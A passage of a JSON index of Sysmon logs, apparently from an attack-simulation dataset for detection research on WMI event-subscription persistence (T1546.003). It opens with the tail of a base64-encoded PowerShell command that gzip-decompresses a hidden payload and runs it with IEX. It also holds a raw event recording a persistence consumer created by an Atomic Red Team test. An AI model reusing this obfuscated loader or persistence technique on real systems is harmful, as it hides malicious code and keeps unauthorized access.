8ATAA3AGgASgB4ADMANwBrAHIAYwBFACsASQArAEIAWgA4ADgANABSAFcAbgBMAC8ATQB1AGUATQBuADMARABjAHUAUQBmAGEAUgA4AFIAcwAzAHAAcABqAEMAQwBIADYAbAArAGkAWgBrAEsAWQBXAFoATABCAGQAZABDAE0AbQBKADQAZQB5AGYAMABuADQAUwA5AGgATQBPAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=\""
        }
      }
    },
    "21": {
      "event_id": "21",
      "length": 1078,
      "source_file": "datasets\\attack_techniques\\T1546.003\\wmi_event_subscription\\windows-sysmon.log",
      "event_index_in_file": 15,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>21</EventID><Version>3</Version><Level>4</Level><Task>21</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T18:16:27.136748800Z'/><EventRecordID>92009</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='6816'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiBindingEvent</Data><Data Name='UtcTime'>2021-06-16 18:16:27.133</Data><Data Name='Operation'>Created</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='Consumer'> \"\\\\\\\\.\\\\ROOT\\\\subscription:CommandLineEventConsumer.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\"</Data><Data Name='Filter'> \"\\\\\\\\.\\\\ROOT\\\\subscription:__EventFilter.Name=\\\"AtomicRedTeam-WMIPersistence-Example\\\"\"</Data></EventData></Event>",
